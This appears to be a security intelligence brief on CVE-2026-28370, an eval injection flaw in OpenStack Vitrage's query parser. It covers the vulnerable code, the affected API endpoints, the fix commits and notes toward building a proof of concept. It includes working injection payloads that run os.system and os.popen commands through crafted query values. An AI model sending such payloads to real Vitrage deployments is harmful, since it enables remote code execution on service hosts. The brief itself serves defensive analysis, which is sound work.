# Intel Brief: CVE-2026-28370

## CVE Summary

| Field | Value |
|---|---|
| **CVE ID** | CVE-2026-28370 |
| **Affected Software** | OpenStack Vitrage |
| **Vendor** | OpenStack |
| **CVSS Score** | 9.1 (Critical) |
| **CVSS Vector** | CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H |
| **CWE** | CWE-95 (Improper Neutralization of Directives in Dynamically Evaluated Code / Eval Injection) |
| **EPSS** | 0.1% (24.6th percentile) |
| **Published** | 2026-02-27 |

## Description

In the query parser in OpenStack Vitrage before 12.0.1, 13.0.0, 14.0.0, and 15.0.0, a user allowed to access the Vitrage API may trigger arbitrary code execution on the Vitrage service host as the user the Vitrage service runs under. The vulnerability exists in `_create_query_function` (originally `_create_query_expression`) in `vitrage/graph/query.py`. The `create_predicate()` function constructs a Python lambda expression string from user-supplied query dictionaries and passes it to Python's built-in `eval()`. The `_evaluable_str()` helper wraps string values with single quotes but does **not** escape embedded single quotes, enabling code injection through crafted query parameters.

## Vulnerability Details

### Root Cause

The vulnerable code path in `vitrage/graph/query.py`:

1. `create_predicate(query_dict)` receives a user-controlled dict
2. `_create_query_expression()` recursively builds a string expression from the dict
3. `_evaluable_str(value)` wraps strings with single quotes but does NOT escape them
4. The final expression is prefixed with `'lambda item: '` and passed to `eval()`

```python
# VULNERABLE CODE (vitrage/graph/query.py lines 66-70)
def create_predicate(query_dict):
    try:
        expression = _create_query_expression(query=query_dict)
        expression = 'lambda item: ' + expression
        return eval(expression)  # <-- CODE INJECTION HERE
```

```python
# INSUFFICIENT SANITIZATION (lines 103-108)
def _evaluable_str(value):
    if isinstance(value, str):
        return '\'' + value + '\''  # No escaping of embedded quotes!
    else:
        return str(value)
```

### Injection Mechanism

A query value containing a single quote can break out of the string literal in the generated expression. For example, the query dict:

```json
{"==": {"key": "' + __import__('os').system('id') + '"}}
```

Generates the expression string:
```python
lambda item: (item.get('key')== '' + __import__('os').system('id') + '')
```

When `eval()` processes this, `__import__('os').system('id')` executes as arbitrary Python code on the Vitrage service host.

### Attack Surface / Entry Points

Multiple API endpoints accept user-controlled `query` parameters that are JSON-decoded and eventually passed to `create_predicate()`:

| Endpoint | Method | Controller | Parameter |
|---|---|---|---|
| `/v1/topology` | POST | `TopologyController.post()` | `query` (JSON string) |
| `/v1/resources` | POST | `ResourcesController.post()` | `query` (JSON string via kwargs) |
| `/v1/resources` | GET | `ResourcesController.get_all()` | `query` (JSON string via kwargs) |
| `/v1/resources/count` | POST/GET | `ResourceCountsController` | `query` (JSON string via kwargs) |

**Call chain**: API controller -> `json.loads(query)` -> RPC call to graph service -> `entity_graph.get_vertices(query_dict=...)` or `entity_graph.algo.graph_query_vertices(query_dict=...)` -> `create_predicate(query_dict)` -> `eval(expression)`

**Authentication**: Requires Keystone authentication and appropriate policy authorization (e.g., `get topology`, `list resources`). The CVSS vector notes PR:H (Privileges Required: High), but any authenticated Vitrage API user with basic read permissions can exploit this.

**Default API Port**: 8999 (configurable via `CONF.api.port`)

## Repository Information

| Field | Value |
|---|---|
| **Repository URL** | https://github.com/openstack/vitrage.git |
| **Vulnerable Version** | 12.0.0 (tag `12.0.0`) -- and ALL prior versions |
| **Fix Commit (master)** | `5b57e2b32a6d02992a28d9a671ebba5e308fd141` |
| **Fix Commit (stable/2025.2)** | `89df4bd2ffda1a5ddea66cd828438a6a171a3b11` (cherry-pick) |
| **Fix Commit (stable/2025.1)** | `8f3fc1eb416656d7d68810eff3cfef7fc9672008` (cherry-pick) |
| **Fix Commit (stable/2024.2)** | `6520c2d9d0ba690ea9f96dc31414c7afd40e9f02` (cherry-pick) |
| **Fix Commit (stable/2024.1)** | `2a35b519eb2d50b5ebcd8dd08650b95ef37dfad4` (cherry-pick) |
| **Patched Versions** | 12.0.1, 13.0.1, 14.0.1, 15.0.1 |
| **Checked-Out Version** | `12.0.0` (tag) -- HEAD at commit `2e5eb67d` |

## Build System

| Field | Value |
|---|---|
| **Language** | Python 3 (>=3.8) |
| **Build System** | setuptools with pbr |
| **Package Manager** | pip |
| **Build Files** | `setup.py`, `setup.cfg`, `requirements.txt` |
| **Install Command** | `pip install .` or `pip install vitrage` |

### Key Dependencies

| Package | Purpose |
|---|---|
| `pbr>=3.1.1` | Build system |
| `pecan>=1.2.1` | Web framework (REST API) |
| `Werkzeug>=0.14.1` | WSGI server |
| `oslo.config>=6.8.0` | Configuration management |
| `oslo.log>=3.44.0` | Logging (used in vulnerable code) |
| `oslo.messaging>=5.36.0` | RPC between API and graph services |
| `oslo.policy>=3.6.0` | Policy/authorization enforcement |
| `keystonemiddleware>=4.21.0` | Keystone auth middleware |
| `networkx>=2.4` | Graph library (entity graph operations) |
| `PasteDeploy>=1.5.2` | WSGI app deployment |
| `SQLAlchemy>=1.2.5` | Database ORM |
| `eventlet>=0.20.0` | Async I/O |

### Minimal Dependencies for PoC

For a standalone PoC that demonstrates the `eval()` injection without a full OpenStack deployment, only the following are needed:
- `oslo.log` (imported in query.py)
- The `vitrage.common.exception.VitrageError` class (simple Exception subclass)

The vulnerable function `create_predicate()` can be tested in isolation by importing `vitrage.graph.query` directly.

## Fix Analysis

The fix (commit `5b57e2b3`) replaces `eval()` with direct function composition:

1. **Removes**: `eval()`, `_evaluable_str()`, `_join_logical_operator()`, `_create_query_expression()`
2. **Adds**: `import operator` module, `ops` dict mapping operator strings to `operator.*` functions
3. **Replaces**: String expression building with direct lambda/closure construction
4. The new `_create_query_function()` returns callable predicate functions directly, never constructing an expression string

```python
# FIXED CODE - uses operator module functions directly
ops = {
    '<': operator.lt, '<=': operator.le, '==': operator.eq,
    '!=': operator.ne, '>=': operator.ge, '>': operator.gt,
}

def create_predicate(query_dict):
    try:
        return _create_query_function(query=query_dict)  # No more eval()
    except Exception as e:
        ...
```

## Public Exploits

| ID | Type | Classification | Reliability | Notes |
|---|---|---|---|---|
| EIP #121641 | Writeup | writeup | theoretical | Points to vulnerable source code on GitHub. Not a working PoC script -- it's the vulnerable `query.py` file itself with commentary on the `eval()` risk. |

**No working PoC exploit scripts exist publicly.** The EIP entry is a reference to the vulnerable source code, not a functional exploit. A PoC must be written from scratch.

### PoC Development Notes

The simplest exploitation path:
1. Craft a query dict where a string value contains a single-quote injection payload
2. The `_evaluable_str()` function wraps it naively, creating a broken expression
3. `eval()` executes the injected code

**Example injection payload** (for standalone testing against `create_predicate` directly):
```python
from vitrage.graph.query import create_predicate

# Benign query
benign = {'==': {'CATEGORY': 'ALARM'}}

# Malicious query - code injection via single-quote escape
malicious = {"==": {"x": "' + str(__import__('os').popen('id').read()) + '"}}
predicate = create_predicate(malicious)
```

For full API exploitation, the payload would be sent as a JSON `query` parameter to the topology or resource API endpoints.

## References

| Type | URL |
|---|---|
| Vulnerable Source (pre-fix) | https://github.com/openstack/vitrage/blob/a1f86950e1314b0c740f9cd9b7e9dbab7d02af51/vitrage/graph/query.py#L70 |
| Bug Tracker | https://storyboard.openstack.org/#!/story/2011539 |
| Fix Commit (master) | https://github.com/openstack/vitrage/commit/5b57e2b32a6d02992a28d9a671ebba5e308fd141 |
| Repository | https://github.com/openstack/vitrage |
| Tag 12.0.0 (vulnerable) | https://github.com/openstack/vitrage/releases/tag/12.0.0 |
| Tag 12.0.1 (patched) | https://github.com/openstack/vitrage/releases/tag/12.0.1 |

## MITRE ATT&CK Techniques

- **T1190** -- Exploit Public-Facing Application
- **T1059** -- Command and Scripting Interpreter
- **T1203** -- Exploitation for Client Execution
